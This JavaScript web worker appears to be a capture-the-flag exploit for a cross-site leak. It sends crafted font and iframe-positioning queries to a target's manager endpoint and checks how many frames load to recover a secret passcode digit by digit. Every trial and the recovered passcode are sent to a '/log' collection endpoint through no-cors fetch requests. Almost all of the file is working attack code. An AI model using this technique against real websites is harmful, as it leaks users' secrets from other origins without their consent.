const BIN = '/log'
const MANAGER = '/api/manager?id=$ID$&nextid=$NID$'
const FONT_QUERY_TEMPLATE = 'selector=h1&sequence=$SEQUENCE$&additions[iframe.f$OLD_FRAME_NUM$][position]=absolute&additions[iframe.f$OLD_FRAME_NUM$][bottom]=-7000px&additions[iframe.f$FRAME_NUM$][position]=relative&additions[iframe.f$FRAME_NUM$][bottom]=0&additions[iframe.s$FRAME_NUM$][bottom]=0'

const CHARACTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPURSTUVWXYZ0123456789"
const newID = () => Array(16).fill(0).map(_ => CHARACTERS[Math.floor(Math.random() * CHARACTERS.length)]).join('')

const TIMEOUT = 200
const MS = 10
const TIMEOUT_COUNT = Math.floor(TIMEOUT / MS)

const log = (...args) => fetch(BIN + '?message[]=' + args.join('&message[]='), {mode: 'no-cors'})
// const log = console.log

const query_manager = (managerquery, fontquery) => {
  return new Promise((resolve, reject)=> {
    fetch(managerquery, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: 'fontquery=$FONT_QUERY$'.replace(/\$FONT_QUERY\$/g, encodeURIComponent(fontquery))
    }).then(res => resolve(res)).catch(err => reject(err))
  })
}

const sleep = ms => new Promise(r => setTimeout(r, ms))

const askframeslength = index => {
  return new Promise(resolve => {
    postMessage({
      action: 'framelength',
      payload: index
    })
    const handlercopy = onmessage
    onmessage = async event => {
      const { action, payload } = event.data
      switch (action) {
        case 'framelength':
          onmessage = handlercopy 
          resolve(payload)
        default:
          await handlercopy(event)
      }
    }
  })
}

const checksequence = async (sequence, index, id, nid) => {
  const managerquery = MANAGER
    .replace(/\$ID\$/g, id)
    .replace(/\$NID\$/g, nid)
  const fontquery = FONT_QUERY_TEMPLATE
    .replace(/\$SEQUENCE\$/g, sequence)
    .replace(/\$FRAME_NUM\$/g, '' + index)
    .replace(/\$OLD_FRAME_NUM\$/g, '' + (index - 1))
  let counter
  for(counter = 0; counter < TIMEOUT_COUNT && (await query_manager(managerquery, fontquery)).status === 403; counter++)
    await sleep(MS);
  if (counter >= TIMEOUT_COUNT) throw Error('failed to manage.')
  // for(counter = 0; counter < TIMEOUT_COUNT && targetwindow.frames[index*2+1].frames.length < 1; counter++)
  //   await sleep(MS);
  // if (counter < TIMEOUT_COUNT) {
    for(counter = 0; counter < TIMEOUT_COUNT && (await askframeslength(index)) < 1; counter++)
      await sleep(MS);
    if (counter < TIMEOUT_COUNT) return true
    else return false
  // } else throw Error('no signal.')
}

const clearpending = async (id) => {
  const managerquery = MANAGER
    .replace(/\$ID\$/g, id)
    .replace(/\$NID\$/g, '')
  await query_manager(managerquery, 'fontquery')
}

const main = async ({ numframes, id }) => {
  let passcode = ''
  for (let forward = 1, frameindex=0; forward >= 0; forward--) {
    for (let i=0, nid=newID(); i < 8 && frameindex < numframes; i++, id = nid, nid=newID()) {
      let nextpasscode = forward ? passcode + i : i + passcode
      log('passcode trial', nextpasscode)
      try {
        if (await checksequence(nextpasscode, frameindex, id, nid)) {
          passcode = nextpasscode
          i = -1
          frameindex++
          log('passcode', nextpasscode)
        }
      } catch (err) { log(err) }
    }
  }
  log('end', passcode)
  await clearpending(id)
}

const handler = async event => {
  const { action, payload } = event.data
  switch (action) {
    case 'start':
      await main(payload)
      break
    default:
      break
  }
}

onmessage = handler
